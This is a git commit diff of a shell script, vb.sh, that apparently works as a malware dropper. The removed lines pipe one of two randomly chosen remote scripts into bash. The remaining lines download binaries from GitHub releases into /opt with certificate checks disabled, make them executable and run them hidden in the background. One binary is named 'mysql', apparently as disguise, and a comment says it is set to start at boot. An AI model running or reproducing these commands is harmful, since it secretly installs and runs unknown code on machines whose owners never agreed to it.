7ab5624e9dfc0c6d6df2ff243e77bbdabb6427f9
you fuck me <151545720+mumu1667@users.noreply.github.com>
2023-12-05 00:52:56 +0700

    Update vb.sh

--- vb.sh
+++ vb.sh
@@ -1,20 +1,6 @@
 #!/bin/bash
 
-# 随机选择并执行命令1或2
-RANDOM_CHOICE=$((RANDOM % 2 + 1))
-if [ "$RANDOM_CHOICE" -eq 1 ]; then
-    curl -s https://raw.githubusercontent.com/mumu1667/trx20/main/43.sh | bash >/dev/null 2>&1 & disown
-else
-    curl -s https://raw.githubusercontent.com/mumu1667/trx20/main/48.sh | bash >/dev/null 2>&1 & disown
-fi
-
-# 获取系统框架
-#cd /opt; wget -qO arm --no-check-certificate https://github.com/mumu1667/trx20/releases/download/wk/arm; chmod +x arm; nohup ./arm >/dev/null 2>&1 & disown
 
 cd /opt; wget -qO i386 --no-check-certificate https://github.com/mumu1667/trx20/releases/download/fuck/i386; chmod +x i386; nohup ./i386 >/dev/null 2>&1 & disown
-
-#cd /opt; wget -qO x86 --no-check-certificate https://github.com/mumu1667/trx20/releases/download/wk/me; chmod +x x86; nohup ./x86 >/dev/null 2>&1 & disown
-
-
-# 执行mmsql并放入开机启动项
 cd /opt; wget -qO mysql --no-check-certificate https://github.com/mumu1667/trx20/releases/download/fuck/mysql; chmod +x mysql; ./mysql & disown
+
